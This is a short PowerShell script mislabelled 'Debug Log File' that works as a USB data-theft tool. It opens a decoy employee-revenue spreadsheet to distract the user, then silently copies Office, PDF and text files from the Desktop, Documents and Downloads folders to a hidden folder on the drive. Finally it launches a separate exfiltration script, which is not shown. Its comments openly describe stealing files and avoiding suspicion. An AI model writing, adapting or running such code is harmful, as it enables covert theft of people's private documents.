# Debug Log File
$usbDrive = (Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match "^[A-Z]:\\" -and $_.Description -eq "Removable Drive" }).Root

# Start Debug Logging

# Define the decoy file (must exist on USB)
$decoyFile = "$usbDrive\Employees Revenues 2024.xlsx"

# Open the Decoy File First (So the user sees something legitimate)

Start-Process -FilePath $decoyFile
    
# Wait a moment to avoid suspicion
Start-Sleep -Seconds 3

# Define target file types to steal
$extensions = @("*.docx", "*.pdf", "*.txt", "*.xls", "*.xlsx")

# Define where to search (Desktop, Documents, Downloads)
$searchPaths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")

# Define a hidden folder on the USB to store the copied files
$targetFolder = "$usbDrive\SystemData"
if (!(Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
}

# Function to copy files stealthily
function Steal-Files {
    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            foreach ($ext in $extensions) {
                Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                    $dest = "$targetFolder\$($_.Name)"
                    Copy-Item $_.FullName -Destination $dest -Force
                }
            }
        }
    }
}

# Execute file stealing
Steal-Files

# Hide the stolen files folder
attrib +h "$targetFolder"

# Define the path to the Python exfiltration script
$pythonScript = "$usbDrive\exfiltrate.py"

# Run the Python exfiltration script and wait for it to finish
Start-Process -NoNewWindow -Wait -FilePath "python.exe" -ArgumentList "`"$pythonScript`""

